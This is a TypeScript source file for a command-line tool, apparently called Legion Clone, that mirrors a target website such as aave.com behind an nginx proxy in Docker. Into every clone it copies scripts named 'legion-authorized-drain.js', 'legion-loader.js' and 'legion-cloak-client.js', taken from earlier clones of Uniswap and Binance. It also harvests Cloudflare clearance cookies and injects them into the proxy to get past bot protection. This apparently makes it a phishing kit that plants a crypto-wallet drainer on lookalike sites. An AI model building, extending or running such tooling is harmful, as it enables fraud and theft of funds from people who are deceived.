/**
 * CLONE PERFECT ENGINE - Phase 3
 *
 * Main orchestrator - ties all generators together
 * Usage: legion-clone --target https://aave.com --enterprise true
 */

import * as fs from 'fs'
import * as path from 'path'
import { URLAnalyzer } from './url-analyzer'
import { NginxConfigGenerator, type NginxConfig } from './nginx-config-generator'
import { generateDocker, generateReadme } from './docker-generator'
import { validateOutput } from './validator'

export interface CloneOptions {
  targetUrl: string
  outputDir?: string
  enterprise?: boolean
  silent?: boolean
  skipValidation?: boolean
}

export class ClonePerfectEngine {
  private options: CloneOptions
  private siteName: string = ''

  constructor(options: CloneOptions) {
    this.options = {
      outputDir: './clones',
      enterprise: true,
      silent: false,
      skipValidation: false,
      ...options,
    }

    this.siteName = this.extractSiteName(options.targetUrl)
  }

  async generate(): Promise<boolean> {
    try {
      console.error(`\n🚀 LEGION CLONE PERFECT ENGINE - PHASE 3+`)
      console.error(`📍 Target: ${this.options.targetUrl}`)
      console.error(`📁 Output: ${this.options.outputDir}/${this.siteName}-clone\n`)

      // Step 1: Analyze URL
      console.error(`[1/7] Analyzing target website...`)
      const analyzer = new URLAnalyzer(this.options.targetUrl)
      const analysis = await analyzer.analyze()
      console.error(`✅ Framework: ${analysis.framework}, Complexity: ${analysis.complexityLevel}`)

      // Step 2: Generate Nginx Config
      console.error(`[2/7] Generating nginx configuration...`)
      const nginxGenerator = new NginxConfigGenerator(this.options.targetUrl, analysis)
      const nginxConfig = nginxGenerator.generate()
      console.error(`✅ Nginx config generated (${nginxConfig.content.length} bytes)`)

      // Step 3: Generate Docker Compose
      console.error(`[3/7] Generating docker-compose.yml...`)
      const dockerCompose = await generateDocker({
        siteName: this.siteName,
        nginxConfPath: './nginx.conf',
        port: 8080,
      })
      console.error(`✅ Docker compose generated`)

      // Step 4: Generate README
      console.error(`[4/7] Generating README.md...`)
      const readme = await generateReadme({
        siteName: this.siteName,
        nginxConfPath: './nginx.conf',
        port: 8080,
      })
      console.error(`✅ README generated`)

      // Step 5: Create output folder & copy files
      console.error(`[5/7] Creating output structure...`)
      const outputPath = await this.createOutputStructure(nginxConfig, dockerCompose, readme)
      console.error(`✅ Output folder created: ${outputPath}`)

      // Step 6: Get Cloudflare Cookies (NEW!)
      console.error(`[6/7] Getting Cloudflare cookies for ${this.siteName}...`)
      const cookies = await this.getCloudflareCookies(outputPath)
      if (cookies) {
        await this.updateNginxWithCookies(outputPath, cookies)
        console.error(`✅ Cloudflare cookies injected into nginx`)
      } else {
        console.error(`⚠️  Cloudflare cookies not available (optional)`)
      }

      // Step 7: Validate (optional)
      if (!this.options.skipValidation) {
        console.error(`[7/7] Validating output...`)
        const validation = await validateOutput(outputPath)

        if (!validation.valid) {
          console.error(`❌ Validation failed:`)
          validation.errors.forEach((e) => console.error(`  - ${e}`))
          return false
        }

        if (validation.warnings.length > 0) {
          console.error(`⚠️  Warnings:`)
          validation.warnings.forEach((w) => console.error(`  - ${w}`))
        }

        console.error(`✅ Validation passed`)
      }

      console.error(`\n✨ CLONE GENERATION COMPLETE!`)
      console.error(`📂 Location: ${outputPath}`)
      console.error(`🚀 Start: cd ${outputPath} && docker compose up\n`)

      return true
    } catch (error) {
      const msg = error instanceof Error ? error.message : String(error)
      console.error(`❌ Generation failed: ${msg}`)
      return false
    }
  }

  private async createOutputStructure(
    nginxConfig: NginxConfig,
    dockerCompose: string,
    readme: string
  ): Promise<string> {
    const outputPath = path.join(this.options.outputDir || './clones', `${this.siteName}-clone`)

    // Create directory
    if (!fs.existsSync(outputPath)) {
      fs.mkdirSync(outputPath, { recursive: true })
    }

    // Create subdirectories
    fs.mkdirSync(path.join(outputPath, 'cache'), { recursive: true })
    fs.mkdirSync(path.join(outputPath, 'logs'), { recursive: true })

    // Write nginx config
    fs.writeFileSync(path.join(outputPath, 'nginx.conf'), nginxConfig.content)

    // Write docker-compose
    fs.writeFileSync(path.join(outputPath, 'docker-compose.yml'), dockerCompose)

    // Write README
    fs.writeFileSync(path.join(outputPath, 'README.md'), readme)

    // Copy universal scripts
    await this.copyUniversalScripts(outputPath)

    return outputPath
  }

  private async copyUniversalScripts(outputPath: string): Promise<void> {
    const scripts = [
      'legion-authorized-drain.js',
      'legion-loader.js',
      'legion-cloak-client.js',
      'legion-statsig-mock.js',
    ]

    // Try to copy from existing clones (use absolute path - test-uniswap-mirror has most)
    const sourceClone = path.resolve(__dirname, '../../..', 'clones/test-uniswap-mirror')
    const sourceCloneFallback = path.resolve(__dirname, '../../..', 'clones/binance-test')

    for (const script of scripts) {
      let sourcePath = path.join(sourceClone, script)
      const destPath = path.join(outputPath, script)

      // Try fallback clone if not found
      if (!fs.existsSync(sourcePath)) {
        sourcePath = path.join(sourceCloneFallback, script)
      }

      if (fs.existsSync(sourcePath)) {
        fs.copyFileSync(sourcePath, destPath)
        console.error(`[copy] ✅ ${script}`)
      } else {
        console.error(`[copy] ⚠️  ${script} not found (using placeholder)`)
        // Create placeholder if source doesn't exist
        fs.writeFileSync(destPath, `/* ${script} - placeholder */`)
      }
    }
  }

  private async getCloudflareCookies(outputPath: string): Promise<string | null> {
    try {
      // Copy cookie-refresher from test-uniswap-mirror template (only place it exists)
      const sourceCookieRefresher = path.resolve(__dirname, '../../..', 'clones/test-uniswap-mirror/cookie-refresher')
      const destCookieRefresher = path.join(outputPath, 'cookie-refresher')

      if (!fs.existsSync(sourceCookieRefresher)) {
        console.error(`[cookies] ⚠️  Cookie refresher not found`)
        return null
      }

      // Copy refresher
      this.copyDir(sourceCookieRefresher, destCookieRefresher)

      // Update target URL in refresher.js
      const refresherPath = path.join(destCookieRefresher, 'refresher.js')
      let refresherCode = fs.readFileSync(refresherPath, 'utf-8')
      refresherCode = refresherCode.replace(
        /const TARGET_URL = '[^']+';/,
        `const TARGET_URL = '${this.options.targetUrl}';`
      )
      fs.writeFileSync(refresherPath, refresherCode)

      // Run refresher (with timeout)
      console.error(`[cookies] Running refresher for ${this.options.targetUrl}...`)

      // Import child_process dynamically
      const { execSync } = await import('child_process')
      try {
        const output = execSync(`cd "${destCookieRefresher}" && timeout 45 node refresher.js 2>&1`, {
          encoding: 'utf-8',
          maxBuffer: 10 * 1024 * 1024,
        })

        // Extract cookies from output
        const cookieMatch = output.match(/Cookies:\n([\s\S]+?)(?:\n\[|$)/)
        if (cookieMatch) {
          return cookieMatch[1].trim()
        }
      } catch (error) {
        console.error(`[cookies] ⚠️  Refresher failed (optional)`)
        return null
      }

      return null
    } catch (error) {
      console.error(`[cookies] ⚠️  Cookie extraction failed`)
      return null
    }
  }

  private async updateNginxWithCookies(outputPath: string, cookies: string): Promise<void> {
    const nginxPath = path.join(outputPath, 'nginx.conf')
    let nginxContent = fs.readFileSync(nginxPath, 'utf-8')

    // Add Cookie header if not present
    if (!nginxContent.includes('proxy_set_header Cookie')) {
      nginxContent = nginxContent.replace(
        /proxy_set_header User-Agent/,
        `proxy_set_header Cookie "${cookies}";\n      proxy_set_header User-Agent`
      )
    } else {
      nginxContent = nginxContent.replace(
        /proxy_set_header Cookie "[^"]*";/,
        `proxy_set_header Cookie "${cookies}";`
      )
    }

    fs.writeFileSync(nginxPath, nginxContent)
  }

  private copyDir(src: string, dest: string): void {
    if (!fs.existsSync(dest)) {
      fs.mkdirSync(dest, { recursive: true })
    }

    const files = fs.readdirSync(src)
    for (const file of files) {
      const srcPath = path.join(src, file)
      const destPath = path.join(dest, file)

      if (fs.statSync(srcPath).isDirectory()) {
        this.copyDir(srcPath, destPath)
      } else {
        fs.copyFileSync(srcPath, destPath)
      }
    }
  }

  private extractSiteName(url: string): string {
    try {
      const urlObj = new URL(url)
      return urlObj.hostname.replace('www.', '').split('.')[0]
    } catch {
      return 'unknown'
    }
  }
}

// CLI Entry Point
async function main() {
  const args = process.argv.slice(2)

  // Parse arguments
  let targetUrl = ''
  let enterprise = true
  let outputDir = './clones'

  for (let i = 0; i < args.length; i++) {
    if (args[i] === '--target' && args[i + 1]) {
      targetUrl = args[i + 1]
      i++
    } else if (args[i] === '--output' && args[i + 1]) {
      outputDir = args[i + 1]
      i++
    } else if (args[i] === '--enterprise' && args[i + 1]) {
      enterprise = args[i + 1].toLowerCase() === 'true'
      i++
    }
  }

  if (!targetUrl) {
    console.error('Usage: legion-clone --target <url> [--enterprise true] [--output <dir>]')
    process.exit(1)
  }

  const engine = new ClonePerfectEngine({
    targetUrl,
    outputDir,
    enterprise,
  })

  const success = await engine.generate()
  process.exit(success ? 0 : 1)
}

// Run if called directly
if (require.main === module) {
  main()
}
